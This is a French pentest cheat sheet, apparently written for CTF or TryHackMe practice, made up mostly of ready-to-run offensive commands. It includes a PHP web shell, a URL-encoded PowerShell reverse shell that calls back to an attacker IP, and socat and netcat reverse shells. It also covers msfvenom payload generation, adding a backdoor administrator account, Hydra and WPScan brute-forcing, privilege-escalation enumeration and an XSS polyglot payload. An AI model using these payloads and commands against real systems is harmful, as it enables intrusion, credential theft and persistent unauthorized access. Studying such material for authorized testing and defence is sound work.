# PENTEST CHEAT SHEET

## Cheat Sheet ultime
https://swisskyrepo.github.io/InternalAllTheThings/

## NMAP

> **Scan port**  
`nmap -T4 -sC -sV -Pn <IP>`

> **Scan Samba**  
`nmap -p <PORT> --script=smb-enum-shares.nse,smb-enum-users.nse <IP>`

## GOBUSTER

> **Enumeration dossier**  
`gobuster dir -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100`  

## NIKTO

> **Header**  
`nikto -h <IP> -p <PORT>`

> **Plugin**  
`nikto -h <IP> -Plugin <PLUGIN>`

> **Verbose**  
`nikto -h <IP> -Display <1|2|E>`
>> 1 : Redirections  
>> 2 : Cookies  
>> E : Erreurs

> **Vulnérabilités**  
`nikto -h <IP> -Tuning <0|2|3|4|8|9>`  
>> 0 : Téléversement de fichier  
>> 2 : Défauts de configuration / Fichiers par défaut  
>> 3 : Divulgation d'informations  
>> 4 : Injection  
>> 8 : Execution de commande  
>> 9 : Injection SQL  

> **Output**  
`nikto -h <IP> -o <FICHIER>`  

## WPSCAN

> **Thème**  
`wpscan --url <URL> --enumerate t`

> **Plugins**  
`wpscan --url <URL> --enumerate p`

> **Utilisateur**  
`wpscan --url <URL> --enumerate u`

> **Brute-force**  
`wpscan --url <URL> –-passwords <WORDLIST> –-usernames <UTILISATEUR>`

## Vulnérabilités d'upload

>- Trouver où les fichiers uploader sont déposés  
`gobuster dir -u <URL> -w <WORDLIST> -x <EXTENSION> -t 100`  

>- Enlever le filter côté client via BurpSuite  

>- Rechercher quel language le back-end utilise via Wappalizer ou les headers des réponses HTTP (PHP, C#, Node.js, Python, Ruby on Rails, etc.)  

>- Télécharger un reverse shell dans le language et remplacer l'IP/Port par ceux voulus  

>- Nommer le shell avec l'extension qui bypass le filtre côté serveur ou changer le type MIME sur BurpSuite  

>- Enumeration pour retrouver le fichier uploadé (au cas où il aurait été renommé)  
`gobuster dir -u <URL/URI> -w <WORDLIST> -x <EXTENSION> -t 100`

>- Une fois le fichier trouvé, trouver un moyen de l'executer (URI, argument ou console)  
*Ne pas oublier d'avoir son port en écoute lors de l'execution*

## Reverse Shell

### WebShell

**Linux**  
>- Copier puis modifier /usr/share/webshells/php/php-reverse-shell.php  
`$ip = '<IP ATTAQUANT>';`  
`$port = <PORT>;`  
>- Puis upload sur le site et accéder au fichier

**Windows**  
>- Créer un fichier php avec la ligne suivante :  
`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

>- Entrer l'URL du fichier avec l'argument "cmd" et la valeur:
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<**IP**>%27%2C<**PORT**>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

*Alors oui, c'est illisible parce que c'est encodé pour un URL mais c'est qu'il faut retenir c'est qu'il n'y a qu'à changer l'ip et le port (en gras) avant de charger l'URL*

>- On se log avec son listener préféré puis on se créer un utlisateur qu'on met dans le groupe admin  
`net user <utlisateur> <mdp> /add`  
`net localgroup administrators <utlisateur> /add`

>- Plus qu'à se log en RDP  
`sudo apt install freerdp2-x11`  
`xfreerdp /v:<IP CIBLE> /u:<utlisateur> /p:<mdp>`

### Netcat Reverse Shell
**Attaquant**  
`nc -lvnp <PORT>`

**Stabilisation**  
`python3 -c 'import pty;pty.spawn("/bin/bash")'` (ou python/python2/python3)  
`export TERM=xterm`  
`CTRL+Z`  
`stty raw -echo; fg`

### Socat Basic Reverse Shell  

**Attaquant**  
`socat TCP-L:<PORT> -` => Universel  
`socat TCP-L:<PORT> EXEC:"bash -li"` => Linux  
`socat TCP-L:<PORT> EXEC:pwsh,pipes` => Windows  

**Cible**  
`socat TCP:<IP ATTAQUANT>:<PORT> EXEC:"bash -li"` => Linux  
`socat TCP-L:<IP ATTAQUANT>:<PORT> EXEC:pwsh,pipes` => Windows  

### Socat Extended Reverse Shell
`socat TCP:<IP ATTAQUANT>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### Merterpreter
`msfvenom --list payload`  
`msfvenom -p <PAYLOAD> -f <FORMAT> -o <OUTPUT> LHOST=<IP ATTAQUANT> LPORT=<PORT>`

## Escalade de privilèges sous Linux

### Énumération
>- [LinEnum](https://github.com/rebootuser/LinEnum)  
>- [LinPEAS](https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md)

### Scripts
>- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)  
>- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)  
>- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)  

### Séquences d'échappement Shell 
> **[GTFOBins](https://gtfobins.github.io)** 
>>- Variable d'environnement *sudo*
>>- Crontab en général
>>- SUID/SGID
>>>- `find / -perm -2000 -type f 2>/dev/null`
>>>- `find / -perm -4000 -type f 2>/dev/null` 
>>>- `find / -perm -6000 -type f 2>/dev/null` 

### Autres

> /etc/shadow en lecture/écriture

> /etc/passwd en lecture/écriture

> **Clés SSH**

> **Mot de passe dans les fichiers de configurations**

> **NFS**

> **Exploit Kernel** (à éviter car peut déstabiliter le système)

> **Capabilities**  
`getcap -r / 2>/dev/null`


## Escalade de privilèges sous Windows

### Énumération 
>- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)  
>- [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)  
>>- `. .\PowerUp.ps1`  
>>- `Invoke-AllChecks`  

### Scripts
>- [PrivescCheck](https://github.com/itm4n/PrivescCheck)  
>- [WES-NG](https://github.com/bitsadmin/wesng)  
>- multi/recon/local_exploit_suggester avec une session meterpreter  

### Séquences d'échappement
> **[lolbas](https://lolbas-project.github.io/#)** 

## JohnTheRipper

**Crackage de hash**  
`john --wordlist=<WORDLIST> <FICHIER>`

## Hydra

**Paramètres**
>- `-l <UTILISATEUR>`
>- `-L <LISTE UTILISATEUR>`
>- `-P <WORDLIST>`
>- `-t <NOMBRE DE THREAD> (16 par défaut)`
>- `-V (mode verbeux)`

**FTP**  
`hydra -l <UTILISATEUR> -P <WORDLIST> -t 64 ftp://<IP>`

**SSH**  
`hydra -l <UTILISATEUR> -P <WORDLIST> <IP> -t 64 ssh`

**Formulaire web *POST***  
`hydra <UTILISATEUR> <WORDLIST> <IP> http-post-form "<CHEMIN>:<IDENTIFIANT>:<REPONSE_INVALIDE>"`  
*Exemple :*  
`hydra -l <UTILISATEUR> -P <WORDLIST> <IP> http-post-form "/:username=^USER^&password=^PASS^:F=Your username or password is incorrect"`

## Samba

> **Accès**  
`smbclient //<IP>/<PARTAGE>`

> **Téléchargement**  
`smbget -R smb://<IP>/<PARTAGE>`

## Exploit

>[Exploit Database](https://www.exploit-db.com/)

>**MetaSploit**  
`msfconsole`  
`search <KEYWORD>`  
`use <NOMBRE>`  
`options`  
`set <OPTION>`  
`run`  

## XSS

**XSS Polyglot Payload**  
`jaVasCript:/*-/*'/*'/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e` (Remplacer les ' par \`)

## Injection de commande

**Cheat Sheet**  
[Payload](https://github.com/payloadbox/command-injection-payload-list)